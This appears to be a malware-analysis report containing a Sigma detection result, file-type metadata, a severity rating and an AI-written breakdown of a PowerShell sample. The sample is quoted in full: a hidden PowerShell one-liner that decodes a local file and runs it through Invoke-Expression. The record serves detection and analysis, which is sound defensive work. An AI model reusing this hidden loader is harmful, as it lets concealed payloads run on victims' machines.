sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects use of executionpolicy option to set insecure policies

Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{EventID=4104; ScriptBlockText=start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden $content = Get-Content -path "c:\Users\Public\public.dat" -Encoding Byte;$exeStr=[System.Text.Encoding]::UTF8.GetString($content);Write-Host $exeStr;iex $exeStr;; ScriptBlockId=d3826be6-ec8b-4ac3-913f-0dfb804612aa; MessageNumber=1; MessageTotal=1; Path=C:\Users\george\Desktop\sample.ps1}

trid.file_type: file seems to be plain text/ASCII

attributes.magic: ASCII text, with no line terminators

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis: The provided PowerShell code initiates a hidden PowerShell process by executing a command to start a minimized instance of PowerShell. It then reads the content of a file named "public.dat" located at "C:\Users\Public\" in byte encoding and converts it to a UTF-8 encoded string. Subsequently, it writes the obtained string to the console using Write-Host and finally executes the string as a PowerShell command using the Invoke-Expression (iex) cmdlet. This behavior is indicative of potential malicious activity, especially when running commands stored in an external file without proper validation or verification.

The code begins by launching a new instance of PowerShell in a minimized window, with the '-windowstyle hidden' flag to make it less visible.

It then retrieves the contents of a file named 'public.dat' from the 'C:\Users\Public' directory, using the 'Get-Content' cmdlet with the '-Encoding Byte' parameter to read the file as a byte array.

The content of the file is then converted to a string using the '.UTF8.GetString()' method of the '[System.Text.Encoding]' class, and the resulting string is stored in the '$exeStr' variable.

The code then uses the 'Write-Host' cmdlet to display the contents of the '$exeStr' variable on the screen, and finally, it executes the contents of the '$exeStr' variable using the 'iex' (Invoke-Expression) cmdlet.

The purpose of the code is to execute the contents of the 'public.dat' file as PowerShell commands, which could potentially have various effects depending on the content of the file.
